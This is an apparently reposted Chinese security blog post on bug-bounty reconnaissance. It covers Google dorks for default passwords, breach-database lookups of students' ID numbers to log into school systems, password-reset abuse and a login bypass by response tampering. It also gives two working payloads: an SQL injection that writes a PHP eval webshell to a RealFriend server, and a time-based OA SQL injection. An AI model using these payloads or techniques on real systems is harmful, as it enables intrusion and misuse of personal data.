---
title: 互联网侧信息泄露-挖掘思路分享
url: https://mp.weixin.qq.com/s/hW4JJNJcK9JUprOAY4UXEg
source: Doonsec's feed
date: 2026-06-29
fetch_date: 2026-06-30T06:07:58.773106
---

# 互联网侧信息泄露-挖掘思路分享

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboSVWawmYXSmiaGaZWe0efc5J9lQvIZp2XdYFV0FfEDlYEiaBVaD0HKuEjvpicpMeUVuyNWEg6McVElJn5v8KLibibudV5ajdJgANhYA/0?wx_fmt=jpeg)

# 互联网侧信息泄露-挖掘思路分享

bcloud
bcloud

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

```
作者:bcloud原文链接:https://xz.aliyun.com/news/14311
```

# 简要

信息收集的重要性不言而喻，根据互联网侧信息泄露+社会工程学技术可以收集大量信息，通过该信息登录后台获取更多功能点扩大信息收集面继续扩大功能点，从而通过更多的功能点测试更多的漏洞。

# 案例1

google搜索初始密码

```
site:xxx.edu.cn  初始密码
```

获取到默认账号和密码规则

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTnBWUukTuMxgicObGnJYc0cX2brHAQ1t8tcjiaoibuscdznLjQr78czvNLB8PHgmMEFLtKT1kYj9tUXiaSg74nXUibTicDCFxAQA6fg/640?wx_fmt=png&from=appmsg)

google搜索学号

```
site:xxx.edu.cn  学号
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTEtZp2icffo1I9DA6dZia0LH2UiahpCpdZlwC1XNomqichcd6y5snhVfBbuGfprZHic36jzTXruZGViaMamhGgY0htWTBbzrOZX7o9Q/640?wx_fmt=png&from=appmsg)

知道初始密码是身份证号，社工库去搜名字检索综合数据

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTBHIgazQqw82lqp4CvSIOicvPr8YeS6ElkzSia1BsUSxFoJyLFtP8fJV2Q6L3nU1bGltRicMia7bZ7VKXgIg9SicIGbXHVhez0y2Qw/640?wx_fmt=png&from=appmsg)

默认账密登录

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRibMicN9QGpPRqX2V9hgWjwicSXMVXfZLpLfC5J6JqG3NFX62iaMxviceOMSy4v1HVmWLGeEicOH3zg0WEjZ9UTI1PfQYvPz0mP8Rts/640?wx_fmt=png&from=appmsg)

成功登录系统

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT27OXG3licEibQoVL4SwIuuEGj4G8ibyvuicYYaMsThIjsq5icQMFMS0PTuic4a9ayf3PW1COBFVN2KxzgTqKiaibgTPJbT2sJicdsbRjY/640?wx_fmt=png&from=appmsg)

# 案例2

同样操作，搜索学号

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR76AUsWzK8WSjicunf7oPF3YhvkYFF3lT3wVYU3MyBSg4HTCBaKEvRnNp12OAce0Gkuh1XUkKI1vybxFrFVhOayvRzVrAaIp6w/640?wx_fmt=png&from=appmsg)

信息收集

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboT4ppgiahbeGBEX28iawmNIhz83jUMOlWrE33gxacFTLPeqjibHZIMxHUicIS38kbc1iccIq267oqBkKc2SF2qsOXR9Kz9bDLMzbgicQ/640?wx_fmt=png&from=appmsg)

忘记密码处

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRW8bOGCicO1pokj1oeN2ReY7uXTqqe1U48gEtlmgLszPNXmVSHX0gXlQbJqZRkp3Bx7RYiaXjI9NWQQdS8uUUEQCd181jK7CGzI/640?wx_fmt=png&from=appmsg)

重置密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQFkOWYdjV7CKu8IRgqT1P5V25ln08iccqcn6tx36efia9bWbbZ2XkDcV0MIC7N3uiapvfQyfcJ8cpk3cHIZ2tLTHNzCyIHbHPGgE/640?wx_fmt=png&from=appmsg)

成功重置登录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRtFUDkQnoKPQhAz5xYcSkcQpUYJofibYR8KOia9VaMRjiaWdNBePzrIUQ2xERibAXpTSAqO5QtzeNRicr1mysSPke5G5960ick29pFU/640?wx_fmt=png&from=appmsg)

# 案例3

google搜索

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSRsWM6o9K5KH1amNOvtOtqtxt6l20OsHTewjzF4G5jrE4EYibZ8PiaXmhbHiaQWdd4uuLw3UUTA1bOKA8MU6Tk2ayrBYSxe5hXmg/640?wx_fmt=png&from=appmsg)

获取到默认初始密码

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSTOdK9s6WknUVWcCjrdicSiaLjGIibNkhian3St0jlgSpfw9n5FmU7iaUwPhicPicEbOI5hich4CdUAbacpicT1tgLKjEytClezKNibuibvU/640?wx_fmt=png&from=appmsg)

登录系统

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTwpnKV5EOtIa9aKlPzUpkC5ic3Lj8PjgWJg6arhkZvAtvIhxGUhjBIgKibhbl59ZvJicXrDQIB2bI2Uoo6RnUwPa7IfCITnfPbuA/640?wx_fmt=png&from=appmsg)

成功登录系统

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTWDXnRbUXXYqcF8oYzkK7IbVbfbiatQ1zPlibGz3bIUEq6h1reSIQVGHIiaZGpfkbia0dNnpfktRaUibO6pNkVy6e1Ynictjf6TZ1gE/640?wx_fmt=png&from=appmsg)

这个信息泄露2000+账号

# 案例4

天翼系统NDay

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRsicFotdxvQqDoH6ric30Z6UTZ9l0icZnSiaSATHQgGFyibvz6HHC745Pv0ImLgmA5K3WFZ1iaCkmwXDmraxucjqceLAicB04BA8hAicw/640?wx_fmt=png&from=appmsg)

直接搜索Nday，使用如下payload

```
/AgentBoard.XGI?user=-1'+union+select+1,'<?php+eval($_POST["cmd"]);?>'+into+outfile+"C:\\Program\+Files\+\(x86\)\\RealFriend\\Rap\+Server\\WebRoot\\4.php"+--+-&cmd=UserLogin
```

成功上传文件造成RCE

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTnkAYWBlnHMg7EE3spb0S6xeMPVp4o2tE9Tiad3oparAn597fmMXX5cebTaydzETKJ7NjIljvY03UFlRMd3J2K2W6L8WBZUy8M/640?wx_fmt=png&from=appmsg)

# 案例5

接口泄露敏感信息
这个可以看JS前端泄露，一般VUE框架都是前后端分离，接口很多，拿到所有接口写个字典爆破一下，说不定那个程序员粗心（高情商说法）有一个接口就没有鉴权。

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRxWyfSA9JcOicbvnvaYXBib5peEx9ibzgdibuOjYQYtrB6iaByTmJWT5ZQAxBvWw6r9C9T3iazeQmiaz9Xjycc3jvZRgOn38uNRicWLeA/640?wx_fmt=png&from=appmsg)

# 案例6

前端逻辑缺陷
改返回包状态码直接绕过登录，这种对于前后端分离框架的网站也是很多的
网站输入用户名密码，登录抓包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboROm7jgEuE4pvC8tRHLicFH0YzPmHpH4ibG4kC6o3yLkjYHuApwMiaut8IjYhFQpke5MhjYCx9meJV4ZIBzq0I25nN7BUfvaGXWnw/640?wx_fmt=png&from=appmsg)

获取上图返回包并更改resultCode为0.发包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboT57q6g9Q7gYLQkCwiczMELw1X3QVOibJUic71jNFzDAG1mbpo9n9Qdy711hQMJLTDM9t5ibB9H0BvxrGpKwib2b1uwb5JAtOlhu0yQ/640?wx_fmt=png&from=appmsg)

成功进入后台

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRL0qiauxK4RsP638PW47ZqtFOvQqK4K0TTGnCTRY2B8Udbep1A9LsgFSN8qkZcfwNzGlnZHUHqthEf2MJ7RhWvOCkSIlfvu0bc/640?wx_fmt=png&from=appmsg)

# 案例7

某OA的Nday
OA系统的漏洞都比较多，遇到网站使用的OA系统可去网上搜索历史漏洞，这里有一个SQL注入。
某OAsql延时注入
payload

```
company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(9-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTfTrgicEdAicshDKcgvCHQAa5tWQcIjicRyALBccSOVl6yP7tficEmGJ0zMpSD73dQAqiaPD7VQoibwRwibfLHVj2pTOgNAwZrxibM064/640?wx_fmt=png&from=appmsg)

sqlmap检测

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSAF9R4vAwZY52LqJJEDkcUH4dzhEjz53RHACpoGJI35eQxMS8kOiciaEnwh8TZAzFicsdWr7uJBOgAsuXNGTdanxw3G6xq8aFdSs/640?wx_fmt=png&from=appmsg)

# 案例8

某旅行公司的接口未授权
可直接访问注册按钮，注册用户
然后进行登录，成功登录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRDX8bLByGF1Ca0Ez8lnYPzVWbiadiaX1nRexg4ticRCZxlry2yZUMnVe45hbLeVLmzIs3Wib2seaPdG3aEiaIRoRu6jh9zalmMbpnE/640?wx_fmt=png&from=appmsg)

还发现管理员用户为弱口令admin:123456

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRh44qZM5jwUIWYD6eZUHIbibPGga9mrPldQJBV71vicawibia5Bx6bSKUicoerC6vcFxmnEhxeJRJMLkKKjPlmVhxjoSxRqSNWlyKE/640?wx_fmt=png&from=appmsg)

# 案例9

网站挂黑链
这种对于ZF性质的网站是很严重的，主要是页面自带连接，可使用一些检测工具进行分析
如下图，某ZF网站登录口，鼠标悬停发现链接为sclbs.net网站

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRGvb6Of6ELwSYyRuqwrKURABjhJtsvRUFmzPKLGZnhXxvCWaqwdib2kqK38O7Jicz6bV14LGibNibm161X3HAyWkmvAulncRqq6cE/640?wx_fmt=png&from=appmsg)

点击直接跳转至BC网站

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRPdlyicDpA6cq0M530nyAVXtduaMnhmLVzNdicwic08x1gRjhibzfIFbwziaPl5pNxlJJ5Piahib9ezZbJfNK29dJu0j2yhNlhuic0XW8/640?wx_fmt=png&from=appmsg)

# 总结

这几个案例算是漏洞挖掘比较常见的，也是相对来说SRC挖掘最快速有效的，但是最好使的还是如下：`社工+互联网侧信息收集拿大分，下课！`

**后台回复加群加入交流群**

**广告：****cisp pte/pts &nisp1级2级低价报考**

**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库****简单介绍****（****加入纷传圈子****送****知识库+漏洞库+面试题库****）**

如果觉得合适可以加入,圈子目前价格39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。

**圈子福利**

**edu漏洞挖掘1v1指导出洞**

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg)

**陌笙src挖掘知识库介绍（内容持续更新中!!!)**

```
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)弱口令漏洞&未授权访问漏洞挖掘任意文件读取&删除&下载&上传漏洞sql注入漏洞url重定向漏洞csrf&ssrf漏洞挖掘XSS&XXE漏洞挖掘等等常见漏洞cors&目录遍历&越权漏洞挖掘EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)CNVD挖掘技巧分享&实战案例报告编写公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)经典常见Nday漏洞(常见中间件&以及各种常见框架)复现云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）APP&小程序漏洞挖掘等各模块不在一一介绍
```

信息收集

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTu9DGyTubluhYicFynwVBKa4V06sDfEVKOyk5Q4ghZzLMDAuLb1M1oR4RJumGWrADPapFjTrOjpksKQ8q0YYCnl3ZWLof8Knzg/640?wx_fmt=png&from=appmsg)

src挖掘基础

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR45bibbJEb28a1gS5yth3r5HyOsgPiaOUHHYriahZyIyrk0LMOsHW4VoDibyBRibTNzptGiaLWX62UwykicwvbxCJPopvklqiaxML8lS8/640?wx_fmt=png&from=appmsg)

src挖掘实战

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTKWnTsN6CXf3djhXIlMKNRj...